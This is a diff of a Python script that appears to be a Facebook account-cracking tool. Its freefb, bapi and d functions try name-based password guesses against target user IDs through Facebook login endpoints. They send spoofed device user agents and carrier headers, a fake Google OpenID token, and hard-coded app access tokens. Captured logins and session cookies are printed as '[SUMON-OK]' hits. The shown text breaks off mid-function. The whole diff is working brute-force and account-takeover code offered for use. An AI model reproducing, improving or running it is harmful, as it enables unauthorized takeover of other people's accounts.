@@ -970,25 +970,84 @@ def SUMONCP():
         linex()
         input("PRESS ENTER TO login NEXT ID...")
 
-def ____PO_CO____():
-    version_choices = ['14', '15', '10', '13', '7.0.0', '7.1.1', '9', '12', '11', '9.0', '8.0.0', '7.1.2', '7.0', '4', '5', '4.4.2', '5.1.1', '6.0.1', '9.0.1']
-    model_choices = ['SM-T835', 'SM-S901U', 'SM-S134DL', 'SM-J250F', 'SM-A217F', 'SM-A326B', 'SM-A125F', 'SM-A720F', 'SM-A326U', 'SM-G532M', 'SM-J410G', 'SM-A205GN', 'SM-A205GN', 'SM-A505GN', 'SM-G930F', 'SM-J210F', 'SM-N9005', 'SM-J210F']
-    build_choices = ['MMB29Q', 'R16NW', 'LRX22C', 'R16NW', 'KTU84P', 'JLS36C', 'NJH47F', 'PPR1.180610.011', 'QP1A.190711.020', 'NRD90M', 'RP1A.200720.012', 'M1AJB', 'MMB29T']
-    version = random.choice(version_choices)
-    model = random.choice(model_choices)
-    build = random.choice(build_choices)
-    ver = str(random.choice(range(77, 577))) # Corrected range
-    ver2 = str(random.choice(range(57, 77))) # Corrected range
-    return (f'Mozilla/5.0 (Linux; Android {version}; {model} Build/{build}; wv) '
-            f'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ver2}.0.{ver}.8 Mobile Safari/537.36')
+def random_lenovo_dalvik_facebook_lite_ua():
+    # Common Android versions used by Lenovo devices
+    android_versions = ["8.0.0", "9", "10", "11", "12", "13", "14", "15"]
+    
+    # Real Lenovo device models (tablets & phones) that appear in actual UAs
+    lenovo_models = [
+        "Lenovo TB-8505FS",      # Tab M8
+        "Lenovo TB-7304X",       # Tab 7 Essential
+        "LET02",                 # Tab M10a 5G
+        "Lenovo TB-X306X",       # Tab M8 HD
+        "Lenovo K10 Note",
+        "Lenovo TB-8703F",
+        "Lenovo YT-J706X",       # Yoga Tab 11
+        "Lenovo TB-8525F",
+        "Lenovo Tab M11",
+        "Lenovo Tab K11 Plus",
+    ]
+    
+    # Realistic build numbers
+    build_numbers = [
+        "PPR1.180610.011", "RP1A.200720.011", "TKQ1.230127.002",
+        "UP1A.231005.007", "SP1A.210812.016", "RQ3A.210805.001",
+        "AP3A.240905.015", "TP1A.220624.014"
+    ]
+    
+    # Randomize core parts
+    android_ver = random.choice(android_versions)
+    model = random.choice(lenovo_models)
+    build = random.choice(build_numbers)
+    
+    # Facebook Lite parameters (realistic values)
+    fbav = f"{random.randint(300, 520)}.0.0.{random.randint(10, 60)}.{random.randint(100, 300)}"
+    fbbv = str(random.randint(400000000, 999999999))
+    fblc = random.choice(["en_US", "en_GB", "fr_FR", "ar_DZ", "es_ES"])  # DZ = Algeria friendly
+    density = random.choice(["2.0", "2.5", "3.0"])
+    arch = random.choice(["arm64-v8a", "armeabi-v7a:armeabi"])
+    
+    # Full Dalvik UA for Facebook Lite (matches real traffic patterns)
+    ua = (
+        f"Dalvik/2.1.0 (Linux; U; Android {android_ver}; {model} Build/{build}) "
+        f"[FBAN/EMA;FBAV/{fbav};FBBV/{fbbv};FBDM/{{density={density}}};"
+        f"FBLC/{fblc};FBRV/{fbbv};FBCR/null;FBMF/Lenovo;FBBD/Lenovo;"
+        f"FBPN/com.facebook.lite;FBDV/{model};FBSV/{android_ver};"
+        f"FBCX/OkHttp3;FBCA/{arch};FB_FW/1;]"
+    )
+    
+    return ua
+def generate_fb_ads_user_agent():
+    # List of common Android versions and build IDs
+    android_versions = [
+        ("13", "TQ3A.230901.001"),
+        ("14", "UP1A.231105.001"),
+        ("15", "AP1A.241205.007"),
+        ("16", "BP2A.250305.031")
+    ]
+    
+    # List of common devices [Manufacturer, Brand, Model]
+    devices = [
+        ("samsung", "samsung", "SM-S928B"), # S24 Ultra
+        ("google", "google", "Pixel 9 Pro"),
+        ("samsung", "samsung", "SM-G991U"),  # S21
+        ("OnePlus", "OnePlus", "CPH2551")    # OnePlus Open
+    ]
 
-def UA():
-    dal = "Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))"
-    a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))
-    b = ";[FBAN/Orca-Android;FBAV/130.0.0.15.89;FBPN/com.facebook.orca;FBLC/sv_SE;FBBV/67467545;FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/GT-I9505;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"+"[FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]Dalvik/2.1.0 (Linux;  U; Android 10.0.1; SM-A520W Build/SKQ1.210216.001) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/ru_RU;FBBV/135374479;FBCR/BSNL;FBMF/samsung;FBBD/samsung;FBDV/SM-A520W;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=720,height=1440};FB_FW/1;][FBAN/FB4A;FBAV/20.0.0.4658;FBBV/6841815;[FBAN/Orca-Android;FBAV/247.0.0.30.84;FBPN/com.facebook.orca;FBBV/410140983;FBLC/en_US;FBCA/arm64-v8a:;FBCR/Ufone;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X695;FBSV/11;FBDM/{density=2.0,width=720,height=1440};][FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=1.5,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M336B;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=2.5,width=1280,height=1280};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-E556B;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1280,height=1280};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M336B/DS;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] "
-    c = ";[FBAN/Orca-Android;FBAV/44.0.0.8.52;FBPN/com.facebook.orca;FBLC/en_US;FBBV/16048044;FBCR/cricket;FBMF/zte;FBBD/zte;FBDV/Z987;FBSV/4.4.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1184};FB_FW/1;]"+"[FBAN/Orca-Android;FBAV/220.0.0.20.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/159507260;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBDV/SM-G950U;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2768};FB_FW/1;]Dalvik/2.1.0 (Linux;  U; Android 10.0.1; SM-A520W Build/SKQ1.210216.001) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/ru_RU;FBBV/135374479;FBCR/BSNL;FBMF/samsung;FBBD/samsung;FBDV/SM-A520W;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=720,height=1440};FB_FW/1;][FBAN/FB4A;FBAV/20.0.0.4658;FBBV/6841815;[FBAN/Orca-Android;FBAV/247.0.0.30.84;FBPN/com.facebook.orca;FBBV/410140983;FBLC/en_US;FBCA/arm64-v8a:;FBCR/Ufone;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X695;FBSV/11;FBDM/{density=2.0,width=720,height=1440};][FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=1.5,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M336B;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=2.5,width=1280,height=1280};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-E556B;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1280,height=1280};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M336B/DS;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] "
-    d = ";[FBAN/Orca-Android;FBAV/230.0.0.12.117;FBPN/com.facebook.orca;FBLC/en_EG;FBBV/169378254;FBCR/Android;FBMF/samsung;FBBD/samsung;FBDV/SM-N9005;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1280};FB_FW/1;]"+"[FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/182747440;FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;]Dalvik/2.1.0 (Linux;  U; Android 10.0.1; SM-A520W Build/SKQ1.210216.001) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/ru_RU;FBBV/135374479;FBCR/BSNL;FBMF/samsung;FBBD/samsung;FBDV/SM-A520W;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=720,height=1440};FB_FW/1;][FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=1.5,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M336B;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=2.5,width=1280,height=1280};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-E556B;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1280,height=1280};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M336B/DS;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;][FBAN/FB4A;FBAV/20.0.0.4658;FBBV/6841815;[FBAN/Orca-Android;FBAV/247.0.0.30.84;FBPN/com.facebook.orca;FBBV/410140983;FBLC/en_US;FBCA/arm64-v8a:;FBCR/Ufone;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X695;FBSV/11;FBDM/{density=2.0,width=720,height=1440};]Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] "
-    ua = a+b+c+d
+    ver, build = random.choice(android_versions)
+    mf, br, dv = random.choice(devices)
+    
+    # Randomize minor version numbers for realism
+    chrome_ver = f"1{random.randint(30, 45)}.0.{random.randint(5000, 7000)}.{random.randint(10, 150)}"
+    fb_ver = f"{random.randint(500, 550)}.0.0.{random.randint(30, 60)}.{random.randint(10, 120)}"
+    fbbv = random.randint(800000000, 900000000)
+
+    ua = (
+        f"Mozilla/5.0 (Linux; Android {ver}; {dv} Build/{build}; wv) "
+        f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_ver} Mobile Safari/537.36 "
+        f"[FBAN/EMA;FBLC/en_US;FBAV/{fb_ver};FBBV/{fbbv};FBCR/Verizon;"
+        f"FBMF/{mf};FBBD/{br};FBDV/{dv};FBSV/{ver};FBPN/com.facebook.adsmanager;]"
+    )
     return ua
 
 def freefb(uid, name, pwx, tl):
@@ -1006,59 +1065,32 @@ def freefb(uid, name, pwx, tl):
         for ps in pwx:
             pw = ps.replace("first", first).replace("last", last).lower()
             secure = str(uuid.uuid4())
-            data = {
-            "adid": str(uuid.uuid4()),
-            "format": "json",
-            "device_id": str(uuid.uuid4()),
-            "email": uid,
-            "password": "#PWD_MSGR:0:{}:{}".format(str(time.time()).split('.')[0],pw),
-            "generate_analytics_claim": "1",
-            "community_id": "",
-            "cpl": "true",
-            "try_num": "2",
-            "family_device_id": str(uuid.uuid4()),
-            "secure_family_device_id": "",
-            "credentials_type": "password",
-            "enroll_misauth": "false",
-            "generate_session_cookies": "1",
-            "source": "login",
-            "generate_machine_id": "1",
-            "jazoest": "8168",
-            "meta_inf_fbmeta": "NO_FILE",
-            "advertiser_id": str(uuid.uuid4()),
-            "currently_logged_in_userid": "0",
-            "locale": "id_ID",
-            "client_country_code": "ID",
-            "fb_api_req_friendly_name": "authenticate",
-            "fb_api_caller_class": "AuthOperations$PasswordAuthOperation",
-            "api_key": "256002347743983",
-            "sig": "e95f435d29d71f03a47918372a565cd5",
-            "access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895",}
-            headers = {
-            'User-Agent': '[FBAN/FB4A; FBAV/73.0.0.4739; FBBV/21951095; [FBAN/FB4A; FBA 20.117;FBBV/287214784; FBDM/{density t = 4 width I = 1200 height=812}; FBLC/en_U meenphone; FBMF/AllView; FBBD/allview; FBPN/com.facebook.katana; FBDV/ Viva FBSV/10; FBCA/armeabi-v7a:armeabi;]',
-            'Accept-Encoding': 'gzip, deflate',
-            'Accept': '*/*',
-            'Connection': 'keep-alive',
-            'Host': 'graph.facebook.com',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Priority': 'u=3, i',
-            'X-Fb-Sim-Hni': str(random.randint(20000,40000)),
-            'X-Fb-Net-Hni': str(random.randint(20000,40000)),
-            'X-Fb-Connection-Quality': 'GOOD',
-            'Zero-Rated': '0',
-            'Authorization': 'OAuth 256002347743983|374e60f8b9bb6b8cbb30f7803043889',
-            'X-Fb-Connection-Bandwidth': '8399727',
-            'X-Fb-Connection-Type': 'MOBILE.LTE',
-            'X-Fb-Device-Group': '5535',
-            'X-Tigon-Is-Retry': 'False',
-            'X-Fb-Friendly-Name': 'authenticate',
-            'X-Fb-Request-Analytics-Tags': 'unknown',
-            'X-Fb-Http-Engine': 'Liger',
-            'X-Fb-Client-Ip': 'True',
-            'X-Fb-Server-Cluster': 'True',
-            'Content-Length': '27',}
-            url = "https://graph.facebook.com/auth/login"
-            result = requests.post(url, data=data, headers=headers).json()
+            ua = random_lenovo_dalvik_facebook_lite_ua()
+            data = {'adid': str(uuid.uuid4()),
+'format': 'json',
+'device_id': str(uuid.uuid4()),
+'family_device_id': str(uuid.uuid4()),
+'secure_family_device_id': str(uuid.uuid4()),
+'cpl': 'true',
+'try_num': '1',
+'email': uid,
+'password':f'#PWD_FB4A:0:{int(time.time())}:{pw}',
+'method': 'auth.login',
+'generate_session_cookies': '1',
+'sim_serials': "['80973453345210784798']",
+'openid_flow': 'android_login',
+'openid_provider': 'google',
+'openid_emails': "['01710940017']",
+'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
+'error_detail_type': 'button_with_disabled',
+'source': 'account_recovery',
+'locale': 'fr_DZ',
+'client_country_code': 'DZ',
+'fb_api_req_friendly_name': 'authenticate',
+'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
+            headers = {"x-fb-connection-bandwidth": str(random.randint(2000000000, 3000000000)), "x-fb-sim-hni": str(random.randint(61000, 65000)),"Authorization":"OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32", "x-fb-net-hni": str(random.randint(61000, 65000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
+            url = "https://b-graph.facebook.com/auth/login"
+            result = requests.post(url, data=data, headers=headers, allow_redirects=False, verify=True).json()
             if "Session_key" in result:
                 coki = ";".join(i["name"]+"="+i["value"] for i in result["Session_cookies"])
                 print(f" {green}[SUMON-OK] {uid}|{pw}")
@@ -1098,56 +1130,44 @@ def bapi(uid, name, pwx, tl):
             last = first
         for ps in pwx:
             pw = ps.replace("first", first).replace("last", last).lower()
-            secure = str(uuid.uuid4())
-            data = {
-            'email': uid,
-            'password': pw,
-            'adid': str(uuid.uuid4()),
-            'device_id': str(uuid.uuid4()),
-            'family_device_id': str(uuid.uuid4()),
-            'session_id': str(uuid.uuid4()),
-            'advertiser_id': str(uuid.uuid4()),
-            'reg_instance': str(uuid.uuid4()),
-            'logged_out_id': str(uuid.uuid4()),
-            'locale': 'en_US',
-            'client_country_code': 'US',
-            'cpl': 'true',
-            'source': 'login',
-            'format': 'json',
-            'omit_response_on_success': 'false',
-            'credentials_type': 'password',
-            'error_detail_type': 'button_with_disabled',
-            'generate_session_cookies': '1',
-            'generate_analytics_claim': '1',
-            'generate_machine_id': '1',
-            'tier': 'regular',
-            'currently_logged_in_userid': '0',
-            'fb_api_req_friendly_name': 'authenticate',
-            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
-            'fb4a_shared_phone_cpl_experiment': 'fb4a_shared_phone_nonce_cpl_at_risk_v3',
-            'fb4a_shared_phone_cpl_group': 'enable_v3_at_risk',
-            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-            'api_key': '882a8490361da98702bf97a021ddc14d',
-            'sig': '62f8ce9f74b12f84c123cc23437a4a32'}
+            # ua = self.____ua____()
+            ua = generate_fb_ads_user_agent()
+            #  ua= generate_dalvik_ua()
+            #ua= generate_2026_oneplus_ua()
+            # dz_hni = (["60301", "60302", "60303"])
+            device_groups = ["5142", "3612", "2048", "1024"] 
+            hni_codes = ["310260", "311390", "310410", "20801", "21401", "26201"]
+            data = {'adid':str(uuid.uuid4()),
+            'email':uid,
+            'password':f'#PWD_FB4A:0:{int(time.time())}:{pw}',
+            'cpl':'true',
+            'credentials_type':'device_based_login_password',
+            "source": "device_based_login",
+            'error_detail_type':'button_with_disabled',
+            'source':'login','format':'json',
+            'generate_session_cookies':'1',
+            'generate_analytics_claim':'1',
+            'generate_machine_id':'1',
+            "locale":"es_CU","client_country_code":"CU",
+            'device':str(uuid.uuid4()),
+            'device_id':str(uuid.uuid4()),
+            "method": "auth.login",
+            "fb_api_req_friendly_name": "authenticate",
+            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
             headers = {
-            'Host': 'graph.facebook.com',
-            'User-Agent': UA(),
-            'Accept-Encoding': 'gzip, deflate',
-            'Accept': '*/*',
-            'Connection': 'keep-alive',
-            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-            'X-FB-SIM-HNI': str(random.randint(20000,40000)),
-            'X-FB-Net-HNI': str(random.randint(20000,40000)),
-            'X-FB-Connection-Bandwidth': '27181576',
-            'X-FB-Connection-Quality': 'EXCELLENT',
-            'X-FB-Connection-Type': 'MOBILE.LTE',
-            'X-FB-HTTP-Engine': 'Liger',
-            'X-FB-Client-IP': 'True',
-            'X-FB-Friendly-Name': 'authenticate',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Content-Length': '1026'}
-            url = "https://graph.facebook.com/auth/login"
-            result = requests.post(url, data=data, headers=headers).json()
+            'content-type':'application/x-www-form-urlencoded',
+            'x-fb-sim-hni':random.choice(hni_codes),
+            'x-fb-connection-type':'unknown',
+            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+            'user-agent':ua,
+            'x-fb-net-hni':random.choice(hni_codes),
+            'x-fb-connection-bandwidth':str(random.randint(200000,400000)),
+            'x-fb-connection-quality':'EXCELLENT',
+            'x-fb-friendly-name':'authenticate',
+            'accept-encoding':'gzip, deflate',
+            'x-fb-http-engine':     'Liger'}
+            url = "https://b-graph.facebook.com/auth/login"
+            result = requests.post(url, data=data, headers=headers, allow_redirects=False, verify=True).json()
             if "Session_key" in result:
                 coki = ";".join(i["name"]+"="+i["value"] for i in result["Session_cookies"])
                 print(f" {green}[SUMON-OK] {uid}|{pw}")
@@ -1171,7 +1191,7 @@ def bapi(uid, name, pwx, tl):
     except net_error:
         time.sleep(10)
     except Exception as e:
-        pass     
+        pass
 
 def graph(uid, name, pwx, tl):
     global loop
@@ -1847,64 +1867,52 @@ def d(uid,pwx,tl):
         for pw in pwx:
             ua = 'Mozilla/5.0 (Linux; U; Android 11; RMX3241 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 OPR/62.4.2254.61190|"Not:A-Brand";v="99", "Chromium";v="98"|11|98.0.4758.101'
             Session = requests.Session()
-            head = {"authority": "m.prod.facebook.com",
-            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
-            "cache-control": "max-age=0",
-            "dpr": "3",
-            "sec-ch-prefers-color-scheme": "light",
-            "sec-fetch-dest": "document",
-            "sec-fetch-mode": "navigate",
-            "sec-fetch-site": "none",
-            "sec-fetch-user": "?1",
-            "upgrade-insecure-requests": "1",
-            "user-agent": 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36',
-            "viewport-width": "980"}
-            free_fb = Session.get('https://m.facebook.com/',headers=head).text
+            free_fb = Session.get('https://m.facebook.com/').text
             cookies = {
-            'datr': 'OpqVaPyImvfQapu_w36Tb6w9',
-            'sb': 'OpqVaFnrZ4qPlR6kiDeA96JW',
+            'datr': 'E_QCaU0v4udGQr5o_3Wzi6sA',
+            'sb': 'E_QCaWJcUYmVYBh1yW_Q6xL1',
+            'm_pixel_ratio': '2.75',
             'ps_l': '1',
             'ps_n': '1',
-            'm_pixel_ratio': '2',
-            'pas': '100061465976024%3A2Br3qvc3Zi',
-            'dpr': '1',
-            'wd': '400x686',
-            'fr': '14GtYkQTpeiC1REGX.AWd_vhrUYobjO8DuKiC98oM3pinpfd5k47Y8B0U3tm9fzubqdxc.BpQbzh..AAA.0.0.BpQcBv.AWe68x2KLB5_lcvMawf-W-Z4I_A',}
+            'dpr': '2.75',
+            'locale': 'en_GB',
+            'vpd': 'v1%3B785x393x2.75',
+            'wd': '393x895',
+            'fr': '09qe4bO3Fv4LfIHNw..BpAvQT..AAA.0.0.BpAvbW.AWc4WjvKsreJxZCzOUWatTYXJnw',}
             params = {
             'appid': 'com.bloks.www.bloks.caa.login.async.send_login_request',
             'type': 'action',
-            '__bkv': '5870af81e45750eb22160e3fe74a22f1ec7a22fa20d66f6fa34875f44676e658',}
+            '__bkv': '95c2f471fdc717a6b79ae75e26e90a643f5613e03d463667d5b99baf34570f30',}
             data = {
-    '__aaid': '0',
-    '__user': '0',
-    '__a': '1',
-    '__req': str(random.randint(1,9)),
-    '__hs': re.search('"haste_session":"(.*?)"',str(free_fb)).group(1),
-    'dpr': '3',
-    '__ccg': 'GOOD',
-    '__rev': '1031154218',
-    '__s': 'bf72tk:w7pc92:xr04hw',
-    '__hsi': re.search('"hsi":"(\d+)"',str(free_fb)).group(1),
-    '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o0wW1gCwjE0AC09Mx60se2G0pS0ny0oi0zE5W0Y81soG0xo2ewbS1LwpEcE1kU1bo8Xw8S0QU3yw',
-    'fb_dtsg': re.search('"dtsg":{"token":"(.*?)"',str(free_fb)).group(1),
-    'jazoest': '24940',
-    'lsd': 'AdEt_BZHc1I',
+    "aaid": "0",
+    "user": "0",
+    "a": "1",
+    "req": "4",
+    "hs": "20391.BP:wbloks_caa_pkg.2.0...0",
+    "dpr": "3",
+    "ccg": "MODERATE",
+    "rev": "1029141574",
+    "s": "3bqy2l:4nyjag:uh2zs6",
+    "hsi": "7566881608767562019",
+    "dyn": "0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o0wW1gCwjE0AC09Mx60se2G0pS0ny0oi0zE5W0Y81soG0xo2ewbS1LwpEcE1kU1bo8Xw8S0QU3yw",
+    "fb_dtsg": "NAfuramg1szA6_XEvFFU8Mb7DtuyjKFtz08CQ5QSOG_ouVtpB6N8VLw:0:0",
+    "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+    "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
     'params': json.dumps({
-        "params": {
+        "params": json.dumps({
